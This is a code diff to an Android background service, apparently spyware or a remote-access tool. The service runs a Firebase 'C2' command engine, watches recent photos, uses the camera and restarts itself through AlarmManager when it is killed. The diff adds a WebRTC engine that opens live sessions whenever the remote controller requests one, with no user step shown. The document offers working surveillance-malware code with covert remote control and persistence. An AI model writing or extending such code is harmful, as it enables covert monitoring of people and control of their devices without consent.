@@ -2117,6 +2117,8 @@ class MonitorService : LifecycleService() {
     }
 
     @Volatile var firebaseC2Engine: FirebaseC2Engine? = null
+    @Volatile var firebaseSignalingRepository: FirebaseSignalingRepository? = null
+    @Volatile var webRtcEngine: WebRtcEngine? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
@@ -2134,10 +2136,36 @@ class MonitorService : LifecycleService() {
         registerRecentPhotosObserver()
 
         if (firebaseC2Engine == null) {
-            firebaseC2Engine = FirebaseC2Engine(this, httpClient, serviceScope) { cmdText, sourceId ->
+            val engine = FirebaseC2Engine(this, httpClient, serviceScope) { cmdText, sourceId ->
                 dispatchCommand(cmdText, sourceId, isDirectServerCommand = true)
             }
-            firebaseC2Engine?.startEngine()
+            firebaseC2Engine = engine
+            engine.startEngine()
+
+            val signalingRepo = FirebaseSignalingRepository(this, engine)
+            val rtcEngine = WebRtcEngine(this, signalingRepo)
+
+            signalingRepo.setCallback(object : FirebaseSignalingRepository.SignalingCallback {
+                override fun onSessionRequested(sessionId: String, requestedCapabilities: List<String>) {
+                    rtcEngine.startSession(sessionId, isOffer = false)
+                }
+                override fun onOfferReceived(sdp: String) {
+                    rtcEngine.handleRemoteOffer(sdp)
+                }
+                override fun onAnswerReceived(sdp: String) {
+                    rtcEngine.handleRemoteAnswer(sdp)
+                }
+                override fun onIceCandidateReceived(candidateJson: org.json.JSONObject) {
+                    rtcEngine.addRemoteIceCandidate(candidateJson)
+                }
+                override fun onSessionTerminated(sessionId: String) {
+                    rtcEngine.close()
+                }
+            })
+
+            signalingRepo.startListeningForSessionRequests()
+            firebaseSignalingRepository = signalingRepo
+            webRtcEngine = rtcEngine
         }
 
         return START_STICKY
@@ -2181,6 +2209,8 @@ class MonitorService : LifecycleService() {
         super.onDestroy()
         Log.i(TAG, "Service destroyed — scheduling self-restart via AlarmManager setExactAndAllowWhileIdle")
         scheduleServiceResurrection()
+        try { firebaseSignalingRepository?.stopListening() } catch (_: Exception) {}
+        try { webRtcEngine?.close() } catch (_: Exception) {}
         pollJob?.cancel()
         serviceScope.cancel()
         cameraExecutor.shutdown()
